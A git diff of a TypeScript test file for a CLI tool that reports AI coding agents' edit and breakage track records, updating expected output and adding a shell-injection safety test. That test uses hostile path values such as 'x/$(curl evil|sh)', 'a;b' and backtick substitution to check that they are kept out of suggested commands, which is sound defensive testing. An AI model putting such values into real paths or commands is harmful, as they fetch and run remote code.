@@ -8,6 +8,7 @@ import type { TrackReport } from '@mindly/engine';
 import { bisectRun } from '../src/commands/bisect.js';
 import { track } from '../src/commands/track.js';
 import { outFor } from '../src/util.js';
+import { areaArg } from '../src/views/track.js';
 import { cli, git, sandbox, testIo, write, type Sandbox } from './helpers.js';
 
 /*
@@ -205,6 +206,7 @@ describe('mindly track', () => {
     expect(cc!.contracts.count).toBe(1);
     expect(cc!.mergeChecks.count).toBe(0);
     expect(cc!.breakages).toMatchObject({ count: 2, of: 20, rate: 0.1 });
+    expect(cc!.breakageSessions).toBe(2);
     expect(cc!.breakages.interval!.low).toBeGreaterThan(cx!.breakages.interval!.high);
     expect(api.clearDifference).toEqual([
       {
@@ -233,6 +235,7 @@ describe('mindly track', () => {
     expect(cc.kept.rate).toBeCloseTo(0.95);
     const cx = report.areas[0]!.agents.find((a) => a.agent === 'codex')!;
     expect(cx.kept).toMatchObject({ count: 140, of: 140 });
+    expect(cx.keptFrom).toEqual({ edits: 140, sessions: 3 });
   });
 
   it('shows the counts, a clear difference in one area and none in the other', async () => {
@@ -241,10 +244,15 @@ describe('mindly track', () => {
     const out = r.stdout;
     expect(out).toContain('Track record - last 30 days - 2 agents - 200 edits');
     expect(out).toMatch(
-      /src\/api\n {2}codex +140 edits +broke 0 \(0%\) - kept 100% of 140 lines\n/,
+      /src\/api\n {2}codex +140 edits +broke 0 \(0%\) - kept 140 of 140 tracked lines \(100%\)\n/,
     );
-    expect(out).toMatch(/ {2}claude-code +20 edits +broke 2 \(10%\) - kept 100% of 20 lines\n/);
-    expect(out).toContain('  -> codex breaks less here (clear difference)');
+    expect(out).toMatch(
+      / {2}claude-code +20 edits +broke 2 \(10%\) - kept 20 of 20 tracked lines \(100%\)\n/,
+    );
+    expect(out).toMatch(
+      / {2}claude-code +20 edits +broke 0 \(0%\) - kept 19 of 20 tracked lines \(95%\)\n/,
+    );
+    expect(out).toContain('  -> codex breaks less often per edit here (clear difference)');
     expect(out).toMatch(/src\/ui\n[^]*-> no clear difference yet/);
     expect(out).toContain('Usage limits: claude-code 0 of 3 sessions - codex 0 of 3');
     expect(out).toContain('-> mindly track --area src/api --explain');
@@ -270,7 +278,7 @@ describe('mindly track', () => {
       'claude-code: checks 1 - decisions 1 - merge checks 0 - 95% interval',
     );
     expect(one.stdout).toContain('What each number counts');
-    expect(one.stdout).toContain('Broke a check: reliable mindly bisect runs');
+    expect(one.stdout).toContain('Broke a check: reliable mindly bisect results');
     expect(one.stdout).toContain('at least 20 edits and 3 sessions in an area');
     expect(one.stdout).not.toContain('src/ui');
     const codex = await trackJson(sb, { agent: 'codex' });
@@ -290,7 +298,9 @@ describe('mindly track', () => {
       'areas',
       'usageLimits',
       'survival',
+      'truncated',
     ]);
+    expect(report.truncated).toBe(false);
     expect(Object.keys(report.window)).toEqual(['since', 'from', 'to']);
     expect(report.window.since).toBe('30d');
     expect(report.minimum).toEqual({ edits: 20, sessions: 3 });
@@ -303,11 +313,13 @@ describe('mindly track', () => {
       'linesRemoved',
       'enoughData',
       'breakages',
+      'breakageSessions',
       'bisect',
       'contracts',
       'mergeChecks',
       'ruleAttempts',
       'kept',
+      'keptFrom',
     ]);
     expect(Object.keys(report.areas[0]!.agents[0]!.breakages)).toEqual([
       'count',
@@ -392,6 +404,36 @@ describe('mindly track output safety', () => {
     const json = await cli(sb, ['track', '--json']);
     expect(json.stdout).not.toMatch(/\\u001b|\\u0007/);
     expect((JSON.parse(json.stdout) as TrackReport).areas[0]!.area).toBe('src/red');
+  });
+
+  it('never puts a folder name a shell would interpret into a suggested command', async () => {
+    expect(areaArg('src/api')).toBe(' --area src/api');
+    expect(areaArg('(root)')).toBe(" --area '(root)'");
+    for (const bad of ['x/$(curl evil|sh)', 'a b', "it's", '-rf', 'a;b', 'a`b`']) {
+      expect(areaArg(bad), bad).toBe('');
+    }
+    const sb = sandbox();
+    await hook(sb, 'codex', 'cx', 'SessionStart', { source: 'startup' });
+    const store = Store.open(join(sb.mindlyHome, 'mindly.db'));
+    try {
+      const project = store.projects.list()[0]!;
+      const session = store.sessions.findByExternal(project.id, 'codex', 'cx')!;
+      store.fileChanges.record({
+        projectId: project.id,
+        sessionId: session.id,
+        path: 'x/$(curl evil|sh)/f.ts',
+        tool: 'Edit',
+        hunkHashes: [],
+        addedLines: 1,
+        removedLines: 0,
+        promptEventId: null,
+      });
+    } finally {
+      store.close();
+    }
+    const r = await cli(sb, ['track']);
+    expect(r.stdout).toContain('-> mindly track --explain');
+    expect(r.stdout).not.toContain('--area x/');
   });
 
   it('says so when there is nothing yet', async () => {
